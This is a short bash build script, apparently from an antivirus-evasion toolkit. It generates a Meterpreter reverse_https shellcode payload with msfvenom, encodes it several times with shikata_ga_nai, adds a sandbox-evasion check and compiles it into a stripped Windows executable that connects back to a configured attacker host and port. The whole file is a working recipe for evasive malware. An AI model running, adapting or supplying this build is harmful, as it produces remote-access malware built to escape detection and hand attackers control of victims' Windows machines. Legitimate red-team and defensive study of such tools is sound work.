#!/bin/bash
# example build script

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# generate payload and call avet
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc.txt

# add fopen sandbox evasion
add_evasion fopen_sandbox_evasion

# set shellcode source
set_shellcode_source static_from_file input/sc.txt

# set decoder and key source
set_decoder none
set_key_source none

# set shellcode binding technique
set_shellcode_binding exec_shellcode

# enable debug output
enable_debug_print

# compile
$win32_compiler -o output/output.exe source/avet.c
strip output/output.exe

# cleanup
cleanup_techniques
